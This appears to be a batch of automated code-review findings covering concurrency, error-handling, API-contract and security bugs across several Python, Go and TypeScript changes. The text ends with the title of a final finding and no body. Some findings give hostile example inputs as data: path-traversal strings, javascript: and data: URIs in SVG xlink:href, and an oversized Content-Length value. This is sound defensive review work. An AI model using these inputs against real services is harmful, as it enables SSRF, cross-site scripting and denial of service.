findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def` but contains no `await`; it calls `requests.get`, which blocks the calling thread. Because this runs on the asyncio event loop during request handling, every other in-flight coroutine on that loop is frozen until billing.internal responds — up to the full 5 second timeout if the upstream is slow or unreachable. Under load this serialises all request handling and turns a single slow dependency into a whole-process stall.

Use the async client already in use in this module, mirroring `fetch_plan`: pass in (or construct) an `httpx.AsyncClient` and `await client.get("https://billing.internal/limits/{tenant_id}", timeout=5)`. If the sync library must be kept, wrap it with `await asyncio.to_thread(requests.get, ...)` so the loop is not blocked. Dropping the now-unneeded `import requests` on line 2 follows.

findings.title: No test covers fetch_plan_limits behavior or its blocking call
findings.body: fetch_plan_limits is a new async function that calls the synchronous `requests.get` (a blocking call) inside an `async def`. No test exercises this function, so if the blocking call stalls the event loop, or if the URL/timeout/response-parsing logic is wrong, nothing would fail. Add a test that calls this function (e.g. via anyio/asyncio test runner) mocking `requests.get`, and ideally an async-lint check or test asserting it doesn't block the loop.

findings.title: Unencoded tenant_id interpolated into internal billing URL
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. Nothing in this function validates or percent-encodes `tenant_id`. If the value reaches here from a request parameter (path segment, query string, or JSON body), a caller can supply `../../admin/keys`, `..%2f..%2fadmin`, or `1?force=true`/`1#` and redirect the call to a different path or query on the internal billing host — a classic SSRF-by-path-manipulation against a service that is presumably only reachable from inside the network and may trust its callers. The attacker is any client that can influence the tenant identifier; what they control is the path suffix; what they get is arbitrary GETs against `billing.internal` plus whatever the response body reveals, since the JSON is returned to the caller.

Fix by validating the identifier against its expected shape (e.g. UUID or integer) before use, and/or by passing it as an escaped component — `requests.get("https://billing.internal/limits/" + quote(str(tenant_id), safe=""))` — rather than raw string interpolation. The same treatment applies to the pre-existing `fetch_plan` path if `tenant_id` is externally supplied there too.

findings.title: Bare except swallows BaseException and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, so `KeyboardInterrupt`, `SystemExit` and `GeneratorExit` are absorbed too — Ctrl-C or a shutdown signal arriving while the HTTP send is in flight becomes a silent `return None` instead of terminating. It also hides genuine bugs such as `NameError`/`AttributeError` from a refactor of `_client`, and `MemoryError`.

The PR description says "catch and log, then continue", but nothing is logged: the failure is now completely invisible, so a permanently broken metrics pipeline produces no signal at all.

Narrow it to the failure modes you actually mean to tolerate and emit a record, e.g.:

```python
try:
    return _client.send(payload)
except Exception:
    logger.exception("metrics push failed")
    return None
```

_Also raised by the security agent:_ Telemetry failures are silently swallowed, not logged as described

findings.title: No test covers the new catch-and-continue behavior
findings.body: The change alters push_metrics so that any exception from _client.send is now swallowed and None returned instead of propagating. No test in this diff verifies that (a) a failing send no longer raises, (b) None is returned, or (c) the error is actually logged (the PR description says 'log', but no logging call is present in the diff at all). Without a test, a future refactor could silently reintroduce a crash, or the missing logging call could go unnoticed indefinitely.

findings.title: try_consume checks and updates _counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, decides on line 16, then awaits `asyncio.sleep(0)` on line 18 before writing on line 19. The `await` is an explicit suspension point, so any number of other `try_consume`/`consume` coroutines for the same tenant can run between the check and the write. Each of them sees the same stale `current`, each passes the `> LIMIT` check, and each writes `current + cost` — so the counter can be pushed well past `LIMIT` and the limiter admits more work than it is supposed to.

The blind assignment on line 19 is a second, independent bug: it writes an absolute value derived from a stale read rather than incrementing, so any increment applied by `consume()` (line 10) while `try_consume` was suspended is overwritten and lost. Note that `consume()` guards exactly this state with `_lock` (line 9), which `try_consume` never takes, so the lock provides no mutual exclusion between the two paths at all.

Fix: wrap the whole read-decide-write sequence in `async with _lock:` and re-read the counter inside the lock, e.g.

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

and drop the `await asyncio.sleep(0)` (or move it outside the critical section) — awaiting inside the decision window is what makes the interleaving reachable.

_Also raised by the security agent:_ try_consume checks and updates the counter outside the lock (TOCTOU)

findings.title: New try_consume has no test covering its concurrency behavior
findings.body: try_consume reads and writes _counters outside of _lock and contains an explicit yield point (await asyncio.sleep(0)) between the check and the write, unlike consume which is lock-protected. This is exactly the kind of check-then-act race the PR title calls out, yet there is no test exercising concurrent calls to try_consume that would reveal two tenants both getting approved past LIMIT. Any test that only calls try_consume sequentially, or asserts on a single call's return value, would pass whether or not the race is fixed.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body:
The `err` from `db.Exec` is scoped to the `if` statement on line 15; after logging it on line 16 it goes out of scope. Lines 18-19 then declare a fresh `var err error` (always nil) and return it, so `WriteSettlement` reports success for every insert failure — the returned error can only ever be non-nil from the `validate` path on line 13. Callers in the end-of-day batch will treat a dropped settlement row as written, and reconciliation will be silently wrong.

If the intent really is "log and continue", make that explicit at the call site rather than inside this function: either `return err` from the Exec (line 15-17) and let the batch loop decide to continue, or change the signature so it does not return an `error` it never populates. Right now the signature promises error reporting that the body does not deliver.

No test exercises WriteSettlement, so this always-succeeds behavior would pass silently — a caller relying on the returned error to detect a failed settlement write would never find out. findings.title: Mutable default `attempted=[]` persists across calls
findings.body:
`attempted=[]` is evaluated once at function-definition time, so every call that omits the argument shares the same list object. Line 10 appends failed recipients to that shared list and line 11 returns it, so the second call returns its own failures *plus* every failure from all prior calls — and callers that mutate the returned list corrupt state for subsequent calls. Use the standard sentinel form:

```python
def send_with_retries(recipients, attempted=None):
    attempted = [] if attempted is None else attempted
```

This also matches the `extra_headers or {}` defensive-copy pattern already used on line 2 of this file.

findings.title: No test covers send_with_retries or its mutable-default bug
findings.body: send_with_retries uses `attempted=[]` as a default argument, which is shared across calls and will accumulate recipients from previous invocations that didn't pass an explicit list. No test exists in this diff for this function, so a test calling it twice with different recipients (without passing `attempted=`) and asserting the second call's result only contains its own failures would catch this — but nothing here does.

findings.title: Function name 'send_with_retries' implies retries but none occur
findings.body: The function is named `send_with_retries`, but the body only calls `_dispatch` once per recipient with no retry loop or backoff — a failed dispatch is simply recorded, not retried. A caller relying on the name would reasonably expect the function to reattempt failed sends. Additionally the parameter `attempted` is used to collect recipients whose dispatch *failed*, not ones that were merely 'attempted', which is the opposite of what the name suggests when reading call sites. Consider renaming to something like `send_and_collect_failures` or adding a short docstring clarifying that no retry occurs.

findings.title: Shared default list leaks recipients across calls and grows unbounded
findings.body:
`attempted=[]` is evaluated once at function definition, so every caller that omits the argument shares and mutates the same list. Two consequences with a security flavour in a long-lived process (worker, web app):

1. Information disclosure between callers: the list returned to caller B contains the failed recipients accumulated from caller A's earlier batch. If recipients are user emails/phone numbers belonging to different tenants or requests, and the return value is logged, rendered, or retried, one request's data ends up in another's output.
2. Unbounded growth: the module-level list is never reset, so every dispatch failure appends permanently — memory grows with the process lifetime, and an attacker who can reliably cause `_dispatch` to fail (e.g. by supplying an address the transport rejects) has a cheap amplifier.

Fix: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted) if attempted else []` inside the body — matching the `dict(extra_headers or {})` pattern already used on line 2.

findings.title: compute_rounding changes half-cent behaviour from >= to >
findings.body:
In a PR described as a pure rename, `calc_rounding` used `line.remainder_cents >= 0.5` while the new `compute_rounding` uses `> 0.5`. Every other function in the file is byte-identical apart from its name, so this is the one semantic change and it is unannounced. For a remainder of exactly 0.5 — the most common rounding boundary in money arithmetic, and one that is reachable whenever a half-cent remainder is produced — the function now returns 0 instead of 1, silently under-rounding the line item. If the change to banker's-style behaviour is intended, it belongs in its own commit with a test pinning the 0.5 case; otherwise restore `>=`.

_Also raised by the security agent:_ Rounding comparison silently changed from >= 0.5 to > 0.5

_Also raised by the tests agent:_ Rounding boundary changed from >= to > with no test coverage

findings.title: Off-by-one slice drops one record per page in page_of_sorted
findings.body:
The slice end is `start + PAGE_SIZE - 1`, so each page yields `PAGE_SIZE - 1` records. Because `start` still advances by a full `PAGE_SIZE` per page (line 11), the record at index `start + PAGE_SIZE - 1` is never returned by page `page` nor by page `page + 1` — it is dropped from the export entirely, one record lost per page. This also diverges from the sibling `page_of` on line 6, which any caller paginating by `PAGE_SIZE` will assume. Change the slice to `ordered[start : start + PAGE_SIZE]`.

_Also raised by the tests agent:_ No test covers page_of_sorted, whose slice drops one record per page

findings.title: File handle leaks on the header-mismatch and exception paths
findings.body:
`fh = open(path)` is not wrapped in a `with`, and `fh.close()` is only reached on the success path. When `header != expected_header` the function returns at line 14 with the handle still open, and any exception raised by `next(reader)` or `list(reader)` (decode errors, malformed CSV) escapes with the handle open too. Under CPython refcounting this is masked most of the time, but in a loop over many partner catalogues it exhausts file descriptors, and it is deterministic on PyPy. Use the same pattern as `read_rows` on lines 5\u20136:

```python
with open(path) as fh:
    reader = csv.reader(fh)
    ...
```

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`charge_card` applies `@retry(attempts=3)` to `billing.gateway.charge`, whose docstring states "NOT idempotent: each call creates a new charge." Any failure the retry decorator treats as retryable but which the gateway actually processed \u2014 a read timeout, a dropped connection after the POST was accepted, a 5xx emitted post-commit \u2014 will produce two or three real charges against the customer's card. The retry succeeds, the caller sees one success, and the duplicates are invisible until a chargeback.

The gateway docstring already names the fix: it supports an `Idempotency-Key` header. Generate one key per logical charge attempt (outside the retry, so all attempts share it) and pass it through `charge()`, so the gateway collapses retries into a single charge. Until that plumbing exists, `charge()` should not be retried at all \u2014 surface the failure and let the caller reconcile via `get_charge`.

Note the contrast with `fetch_charge` on lines 5\u20137: `get_charge` is documented "Safe to repeat," so the retry there is correct. The new decorator copies that pattern onto an operation with the opposite safety property.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: No test catches retry-induced duplicate charges
findings.body: charge_card wraps billing.gateway.charge, which is explicitly documented as NOT idempotent ('each call creates a new charge'), in a @retry(attempts=3) decorator with no idempotency key passed. If a transient failure occurs after the gateway processed the charge but before the response reached the caller, retry will create duplicate charges. There is no test in this diff exercising the retry-on-failure path for charge_card, so nothing would fail if this bug were introduced or reintroduced later (e.g. during a refactor that removes an idempotency key if one were added).

A caller reading only charge_card's name and signature (as opposed to digging into gateway.py) would reasonably assume the retry wrapper is safe, contradicting the documented contract of the function it wraps.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body: `datetime.now()` returns a naive local datetime, but `Invite.expires_at` is documented as always timezone-aware UTC. Python raises `TypeError: can't subtract offset-naive and offset-aware datetimes` for `invite.expires_at - cutoff`, so `expires_within` fails on every invocation, not just at boundaries. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does; the `.replace(microsecond=0)` truncation is also unnecessary and only shifts the cutoff up to a second into the past.

Subtracting a naive datetime from an aware one raises TypeError. A single test calling expires_within with a real Invite instance would have caught this before merge; as it stands nothing would fail in CI even though the function is broken.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body: `Account.billingContact` is declared optional in `web/src/types.ts` (`billingContact?: { name: string; email: string }`) with the comment "Absent until the customer completes onboarding." `contactEmail` accesses `.email` directly, so for any account that has not completed onboarding this throws `TypeError: Cannot read properties of undefined (reading 'email')`. Note the sibling function on line 4 correctly guards with `?.` and a default, which confirms the absent case is reachable on this page. Either use `account.billingContact?.email?.toLowerCase() ?? ""` (and widen the return type / pick a sensible default), or narrow the parameter type to a variant where `billingContact` is required so callers are forced to check. The PR description asserts the account payload is always present, but that is about the account object, not about `billingContact`.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch` documents `timeout` as MILLISECONDS and passes it straight through as `timeout_ms`. Passing `30` gives the partner call a 30 ms budget, which will almost certainly time out — and the PR description states the intent was a generous timeout for a slow API. Pass `timeout=30000` (or whatever second value you meant, multiplied by 1000). Note also that the default `retries=3` shares the same budget per the docstring, so the effective per-attempt window is even smaller.

findings.title: New sync_partner_catalogue has no test covering its timeout behaviour
findings.body: sync_partner_catalogue() calls fetch(url, timeout=30). Per clients/http.py's docstring, fetch's timeout parameter is in milliseconds, so this passes effectively a 30ms timeout to a 'slow' partner API — the opposite of the stated intent ('Timeout set generously'). No test in this diff exercises this function or asserts what timeout value is actually passed through to fetch/the transport. A test that called sync_partner_catalogue with a fake fetch/transport and asserted the timeout value reached the transport call would have caught the units mismatch immediately.

findings.title: Index duplicates existing invoices_tenant_created_idx from migration 0007
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same table, columns and sort order as `invoices_tenant_created_idx`, already applied in migration 0007. Postgres will happily create it: `IF NOT EXISTS` matches on index *name*, not definition, so the differing name means the guard does nothing. The result is a second copy of the same B-tree that must be maintained on every insert/update/delete of `invoices`, plus the disk it occupies, with no query benefit — the planner will simply pick one. If the reporting query is genuinely not being served, the cause is something else (e.g. a differing filter column or a stale plan), and adding this index will not fix it. Recommend dropping this statement and confirming the existing index is used.

findings.title: priority=9 delays reset email; scale is inverted (0 drains first)
findings.body:
`enqueue` documents `priority` as an ordering index where **0 is drained first and 9 is drained last**. Passing `priority=9` therefore puts password-reset mail behind every other job on the queue — including the nightly digest batch this PR is trying to jump ahead of. It is also strictly worse than the previous behaviour, which used the default of 5.

To get the intended effect, pass a low value: `enqueue(ResetEmail(user, token), priority=0)` (or a small number like 1 if 0 is reserved for something else).

_Also raised by the security agent:_ priority=9 drains last — reset mail delayed, not prioritised

findings.title: No test verifies the effective queue ordering of reset emails
findings.body: send_reset_email now calls enqueue(ResetEmail(user, token), priority=9). Per queue/priority.py's docstring, priority is an ordering index where 0 drains first and 9 drains last — the opposite of what the name suggests. There is no test asserting what priority value is passed, nor any test asserting the intended behavior (resets processed ahead of digests). If the intent was to prioritize resets, the diff instead sends them to the back of the queue, and no test would catch this regression either way.

findings.title: upsert called with un-normalised title terms; articles silently unfindable
findings.body:
`upsert` explicitly requires `terms` to be already lower-cased and de-duplicated, and states that it performs no normalisation itself — a term differing only by case creates a separate posting list that lower-casing queries never match, so the document indexes "successfully" but is silently unfindable by that term. `article.title.split()` yields the title's words verbatim, so any capitalised word (which is most words in a title, including the leading one) is indexed under an unmatchable key. Punctuation aside, this means practically every published article is only partially searchable.

Normalise before the call, e.g. `upsert(article.id, {w.lower() for w in article.title.split()})`, or push the normalisation into `upsert` itself if every caller should get it.

findings.title: No test covers publish() indexing new articles
findings.body: publish() now calls upsert(article.id, article.title.split()), but no test in this diff verifies that publishing an article makes it findable in the search index (e.g. querying a lower-cased term from the title returns the doc_id). Since upsert's documented contract requires terms to be pre-lower-cased and de-duplicated, and split() does neither, a test exercising publish() + a subsequent search query would likely catch this immediately — but nothing here does.

findings.title: Referer logged unscrubbed, leaking the auth token into logs
findings.body:
The removed branch passed the Referer value through `_scrub_uri(value, extra_param_keys)` before storing it for logging; the replacement copies `request.headers[header]` verbatim for every header including Referer.

`jupyter_server/auth/identity.py` builds notebook URLs as `f"{base}?token={token}"`, and its own docstring notes that the browser therefore sends the token back in the Referer header on every subresource request. Any 5xx that hits this log path will now persist a usable authentication token in the server log, where it is readable by anyone with log access (operators, log shipping, crash reports) and replayable for full access to the server.

Restore the per-header scrub for Referer (and keep applying it to any other URI-bearing header) rather than logging the raw value. As a side effect of the removal, the `extra_param_keys` argument this function still accepts appears to be unused now, which is a second signal that the sanitisation was dropped rather than relocated.

_Also raised by the security agent:_ Removing Referer scrubbing leaks auth tokens into server logs

findings.title: No test catches removal of Referer token scrubbing
findings.body: The change deletes the call to _scrub_uri for the Referer header, which per the identity.py docstring exists specifically because tokens are handed out in URLs and echoed back via the Referer header on subresource requests. If this scrubbing is dropped, tokens could be written verbatim into logs on 5xx errors. No test file is included in this diff, and nothing in the shown context indicates an existing test asserts that logged Referer values are scrubbed of token query parameters. A test exercising the 5xx logging path with a Referer containing a token= parameter, asserting the token does not appear in the logged output, would have caught this regression.

findings.title: Dropping xlinkhref from URL check reopens SVG xlink:href XSS
findings.body:
`validateProp` previously routed `href`, `src` **and** `xlinkhref` through `isAnchorLinkAllowed(value)`, which rejects the `javascript:`, `data:text/html` and `vbscript:` prefixes listed in `unsafeLinkPrefix`. After this change `xlinkhref` no longer hits that branch, so its value falls through to whatever the default disposition is and is emitted as-is.

Adversary: any end user who can submit markdown (the file header states rendered attributes come from author-supplied markdown that "in this product includes content submitted by end users"). What they control: the full attribute value, e.g. `<svg><a xlink:href="javascript:...">` or `<use xlink:href="data:text/html,...">`. What they get: script execution in a viewer's origin — session cookies, CSRF-free actions as the viewer.

`xlink:href` is a long-standing XSS sink precisely because it is a URL-bearing attribute that is easy to forget alongside `href`/`src`; it is not a "rarely used SVG attribute" from a sanitiser's point of view. If the goal is to shrink the attribute surface, drop `xlinkhref` from the *allowlist* of renderable attributes entirely rather than from the value check — removing it only from the check is strictly weaker than both the before state and the intended after state.

_Also raised by the correctness agent:_ xlinkhref no longer scheme-checked, permitting javascript: URIs

findings.title: No test guards xlinkhref validation removal
findings.body: The change removes the 'xlinkhref' case from the attribute check that routes values through isAnchorLinkAllowed. If this removal is wrong (e.g. it reopens an XSS vector via SVG xlink:href with javascript:/data: URIs), no test in this diff would fail — there is no test file included at all. Since the surrounding code comment indicates validateProp is the only defense against malicious markdown, a regression test asserting that xlink:href attributes with unsafe URI schemes are rejected (or confirming the removal is intentional and safe) should exist to catch a revert or similar mistake in the future.

findings.title: Removing ValidateID breaks buildPath's documented caller contract
findings.body:
`common.ValidateID(projectQueryParameter)` was the only check on the caller-supplied project name on this path. The retrieved `DAO.buildPath` states in its own doc comment that it "does no validation of its own: callers are required to have validated the names before this point", and it builds the on-disk path with `filepath.Join(d.Folder, project, kind)`. `filepath.Join` calls `Clean`, which *resolves* `..` segments instead of rejecting them, so a project query parameter such as `../../etc` produces a path outside `d.Folder`. The PR description's premise — that the join already scopes under the folder root — is therefore incorrect.

Also note that removing the check weakens the equality guard on line 4: the path parameter is now compared against an arbitrary unvalidated string, so a request can satisfy the "path and query agree" branch with a traversal value in both.

Restore the `ValidateID` call (or move an equivalent check into `buildPath`) before the value reaches the DAO.

_Also raised by the security agent:_ Path traversal: project query param no longer validated before path join

findings.title: No test covers removal of project-name validation before path join
findings.body: The diff removes the common.ValidateID check on projectQueryParameter, which previously guarded the value later used to build a filesystem path via buildPath (per file.go's documented contract that callers must validate names). No test in this PR exercises list() with a malicious or malformed projectQueryParameter (e.g. containing '../' or path separators) to confirm the behavior is still safe or to catch a future regression if validation needs to be restored. Since buildPath explicitly states it does no validation of its own and relies on callers, a test asserting the list() function's handling of unvalidated project names is warranted here.

findings.title: Part buffer sized from client-declared Content-Length (memory exhaustion)
findings.body:
`rw := multipart.NewRW().Reserve(contentLength)` sizes the in-memory part buffer from a value the client declares, before any of the body has been read or verified. A client that sends `Content-Length: 10995116277760` (or any large value) on an `UploadPart` request causes the server to reserve that much buffer up front, regardless of how many bytes it actually sends — and it can then abandon the connection. Repeating this across a few concurrent requests exhausts the heap and takes the process down.

The previous code (`multipart.NewRW()`, growing a page at a time as `io.Copy` consumed the body) made peak memory proportional to bytes actually delivered, which is self-limiting.

If the pre-reservation is worth keeping for the common case, clamp it: reserve `min(contentLength, someMaxPartSize)` (S3 caps a part at 5 GiB, and this server presumably has its own upload limit), reject negative/absent `contentLength` rather than passing it through, and keep relying on incremental growth beyond the clamp. Also confirm `Reserve` handles a negative or zero argument safely, since `contentLength` is `int64` and can be `-1` for an unknown length.

_Also raised by the correctness agent:_ Buffer pre-reserved from unvalidated client Content-Length

_Also raised by the correctness agent:_ Negative contentLength (-1, unknown length) passed straight to Reserve

findings.title: No test verifies Reserve(contentLength) behavior or bounds
findings.body: The change introduces `multipart.NewRW().Reserve(contentLength)`, pre-allocating a buffer sized directly from the caller-supplied contentLength. No test in this diff (or apparently in the surrounding package, since none is shown) exercises this path — e.g. verifying that a large or mismatched contentLength doesn't cause excessive allocation, that a negative/zero contentLength is handled, or that behavior still matches actual body size when Content-Length is wrong. If Reserve mis-sizes the buffer or mishandles an untrusted length, nothing here would catch it.

findings.title: Default flips from https to http when is_secure is unset
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` only selected HTTP on an explicit `is_secure=False`; every other case (key absent, `None`, truthy) yielded HTTPS. The new expression `"https" if request.meta.get("is_secure") else "http"` treats the absent key and `None` as falsy, so any request that does not explicitly set `request.meta["is_secure"] = True` is now built as `http://...`. That is the common case, since callers that relied on the secure-by-default behaviour never set the flag at all. The resulting URL carries the signed S3 request (and any payload) over an unencrypted connection.

If the intent was only to simplify, preserve the original default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or `scheme = "https" if request.meta.get("is_secure", True) else "http"`.

_Also raised by the security agent:_ S3 requests default to plaintext http when is_secure is unset

findings.title: Default scheme flip (secure-by-default → insecure-by-default) is untested
findings.body: This line changes the default scheme selection logic: previously, missing/None `is_secure` defaulted to "https" (only explicit `False` gave "http"); now missing/falsy `is_secure` defaults to "http". This is a meaningful security-relevant behavior change (default now transmits over plaintext HTTP unless is_secure is truthy), but no test in this diff exercises `download_request` with `is_secure` unset, `is_secure=False`, or `is_secure=True` to confirm the resulting scheme. If this ternary were reverted or further modified incorrectly, nothing would fail.

findings.title: DELETE requests now authorize as "push", bypassing the delete permission
findings.body:
The removed `switch` mapped `http.MethodDelete` to the distinct `"delete"` action. The new two-branch form classifies every non-GET/HEAD method as `"push"`, so a DELETE request produces `ResourceAction{Name: name, Action: "push"}` and is authorized against the caller's push grant.

Per `pkg/api/config/config.go`, the three actions are distinct precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones." After this change that separation no longer exists at the enforcement point: push implies delete. Conversely, an account granted only `delete` and not `push` will now be refused, so the change is wrong in both directions.

Restore the explicit `case http.MethodDelete: action = "delete"` branch (the collapse is safe only for POST/PATCH/PUT). If the intent was to simplify, keep DELETE as its own branch before the catch-all.

_Also raised by the correctness agent:_ DELETE now requests "push" access, bypassing delete-only restrictions

findings.title: Fallback for OPTIONS/other methods changed from "pull" to "push"
findings.body: The old switch had `default: action = "pull"`, so any method outside the enumerated set (OPTIONS, TRACE, CONNECT, or a malformed method string) was treated as a read. The new negated condition sends all of those to `"push"`. Read-only accounts that could previously issue e.g. an OPTIONS preflight against a repository will now be denied. If the intent was only to simplify the write-method list, keep the permissive default by enumerating the write methods explicitly rather than negating the read methods.

findings.title: No test covers DELETE-method action mapping change
findings.body: The mapping for http.MethodDelete previously resolved to the distinct "delete" action, and now falls into the generic "push" branch. This is a behavior change (an account permitted to push could now delete). No test file is part of this diff, so if a test elsewhere still asserts DELETE maps to "delete", it would need updating to pass; if no such test exists, this regression would be undetected by the test suite.

findings.title: Size guard clears the whole cache, discarding the entry just fetched
findings.body:
After inserting `tenant`, the function checks `len(_CACHE) > 1000` and calls `_CACHE.clear()`, which removes every entry — including the one written on line 10. So on the call that crosses the threshold, `get_tenant_fresh(x)` returns the tenant but a subsequent `get_tenant(x)` returns `None`, which is exactly the opposite of the write-through behaviour the function advertises. It also evicts all other tenants at once, so every reader falls back to `_fetch` simultaneously.

Prefer a bounded eviction policy (e.g. `collections.OrderedDict` with `popitem(last=False)`, or `functools.lru_cache`-style bounding), or at minimum re-insert the current entry after clearing.

_Also raised by the security agent:_ Whole-cache flush at 1000 entries enables cheap cache-eviction amplification

findings.title: get_tenant_fresh name hides destructive cache-clearing side effect
findings.body: The function is named like a simple 'get' accessor and its docstring-free signature suggests it just fetches a fresh value and caches it. But it also unconditionally clears the entire shared _CACHE (wiping every other tenant's cached entry) whenever the cache exceeds 1000 items. A caller relying on the name alone would not expect calling get_tenant_fresh for one tenant to silently evict all other tenants from cache. At minimum this behavior should be documented in a docstring or comment; ideally the eviction policy shouldn't be a surprise side effect of a 'get' call.

findings.title: No test coverage for get_tenant_fresh caching/eviction behavior
findings.body: get_tenant_fresh introduces new behavior: it fetches fresh data, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff. If the cache write were dropped, if the eviction threshold were off, or if the full-clear eviction policy were changed to something incorrect, nothing would fail. Add tests asserting that (1) the returned value matches the fetched tenant, (2) _CACHE is updated with the fetched value, and (3) the cache is cleared once size exceeds 1000.

findings.title: README still references removed `--workers` flag
findings.body:
cli.py renames `--workers` to `--concurrency`, but README.md line 7 still says `--workers` — how many worker processes to start. A user following the README will pass `--workers` and get an argparse error since the flag no longer exists. Update the README entry to `--concurrency`.

_Also raised by the correctness agent:_ README still documents the removed --workers flag

findings.title: Flag rename breaks args.workers consumers and existing invocations
findings.body: Renaming `--workers` to `--concurrency` also renames the argparse destination: parsed results now expose `args.concurrency`, and `args.workers` raises `AttributeError`. Any call site, script, CI job, Dockerfile CMD or systemd unit that passes `--workers` will now fail with `unrecognized arguments`. If the rename is intended to be non-breaking, keep the old spelling as an alias and a compatible dest, e.g. `p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`, and confirm every reader of `args.workers` in the codebase was updated.

findings.title: Flag rename from --workers to --concurrency has no test coverage
findings.body: The parser's flag was renamed from `--workers` to `--concurrency`. No test in this diff (or referenced) exercises `parser()` to confirm `--concurrency` is accepted and `--workers` now fails/is rejected. If this rename were reverted or mistyped, nothing would fail.

findings.title: Docstring says 'total ... as an integer' but return type changed to dict
findings.body: The docstring on line 2 states "Return the total number of API calls this month as an integer." but the implementation now returns a dict mapping day to count (lines 3-4). A caller relying on the docstring would expect an int and could misuse the return value (e.g. sum, compare, or serialize incorrectly), breaking on the new dict shape.

findings.title: Return type changed from int to dict without updating callers/docstring
findings.body: `monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns a `{day: count}` mapping. Any existing caller doing arithmetic, comparison, or formatting on the result (e.g. `monthly_usage(a) > limit`, `f"{monthly_usage(a)} calls"`) will now silently misbehave or raise `TypeError`. The docstring on line 2 still states "Return the total number of API calls this month as an integer", so it no longer describes the function. Either keep the total (e.g. return both, or add a separate `monthly_usage_by_day`) or update every caller and the docstring together.

findings.title: Return type change (int → dict) has no accompanying test
findings.body: monthly_usage now returns a per-day dict instead of a single integer total, changing its public contract for any caller. No test file is included in this diff to verify the new shape (keys, aggregation correctness, empty-result behavior). If the GROUP BY/dict-comprehension logic were wrong (e.g., wrong key name, wrong aggregation, or malformed row access), nothing would currently catch it.

findings.title: Renaming `page_size` to `limit` breaks keyword callers
findings.body: `list_invoices` is a public-looking API function whose second parameter was renamed from `page_size` to `limit`. Any existing caller written as `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: got an unexpected keyword argument 'page_size'`; positional callers are unaffected, so the breakage is silent until runtime. No callers were retrieved for this review, so I cannot confirm the blast radius — please grep for `page_size=` at call sites. If backwards compatibility matters, accept the old name for a deprecation period (e.g. `def list_invoices(tenant_id, limit=50, cursor=None, page_size=None)` mapping `page_size` onto `limit` with a warning).

findings.title: Docstring still documents the removed `page_size` parameter
findings.body:
The Args block still names `page_size`, which no longer exists in the signature. Readers (and any doc tooling that cross-checks parameter names) will be pointed at a keyword that now raises `TypeError`. Update the entry to `limit: how many invoices to return.`

_Also raised by the docs agent:_ Docstring still references old parameter name page_size

findings.title: Parameter rename has no test verifying call compatibility
findings.body: list_invoices's second parameter was renamed from page_size to limit (and internally page->offset per PR description), which breaks any caller passing it as a keyword argument (list_invoices(tenant_id, page_size=10)). No test in this diff exercises the function signature or keyword-call behavior, so a regression in the rename (or a caller relying on the old name) would not be caught.

findings.title: verify/cert accepted by request() but never passed to the adapter
findings.body:
The new `request()` signature still accepts `verify` and `cert` (lines 148-149), but nothing in the body reads them: the `Request` is populated with method/url/headers/files/data/params/auth/cookies/redirects/proxies/hooks only, then `self.send(prep)` is called. `send()` in turn builds a bare `HTTPAdapter()` and invokes `adapter.send(request)` with no verify/cert/proxies arguments, so whatever TLS policy the caller asked for is dropped on the floor.

Concretely, a caller doing `session.get(url, verify='/etc/ssl/corp-ca.pem')` or relying on the library's verify-by-default behaviour now gets whatever the un-parameterised adapter default happens to be. If that default is anything other than full verification, every HTTPS request in the refactored path is silently unauthenticated.

Thread `verify` and `cert` (and `timeout`/`prefetch`) through `prepare()`/`send()` into `adapter.send(...)` before this path replaces `old_request`, and add a test asserting that `verify=False` and an explicit CA bundle both reach the adapter.

Adversary: anyone in a network position between the client and the server (hostile Wi-Fi, upstream ISP, compromised proxy). What they control: the TLS handshake they present. What they get: full plaintext of requests including `Authorization` headers and cookies carried on `req.auth`/`req.cookies`, plus response tampering.

findings.title: New `request()` silently drops timeout/verify/cert/prefetch and session state
findings.body: The rewritten `request()` keeps the full public signature but only forwards method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies and hooks onto the `Request`. `timeout`, `verify`, `cert`, `prefetch`, `return_response` and `config` are accepted and then ignored — callers asking for a timeout get none, and callers passing `verify=False`/`cert=...` get default TLS verification behaviour instead, which fails or succeeds contrary to what they asked for. Equally, none of the session-level defaults (`self.headers`, `self.cookies`, `self.auth`, `self.params`, `self.hooks`, `self.verify`) are merged in, so a configured `Session` behaves like a bare request. Parameters that cannot yet be honoured should raise/assert rather than be accepted and discarded.

findings.title: `from adapters import HTTPAdapter` is not a package-relative import
findings.body: Every other import in this module is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` will only resolve under Python 2 implicit relative imports; on Python 3 it raises `ImportError` at import time of `requests.sessions`, which breaks importing the package at all. It can also silently bind a top-level `adapters` module on sys.path. Use `from .adapters import HTTPAdapter`.

findings.title: `_send_request` deleted but `old_request` still calls it
findings.body: The `_send_request` helper was removed in this diff, yet the retained `old_request` body still ends with `return self._send_request(r, **args)`. Any call reaching that path raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either delete `old_request` too, or keep `_send_request` until the migration finishes.

findings.title: A fresh HTTPAdapter per send destroys pooling; close() is now a no-op
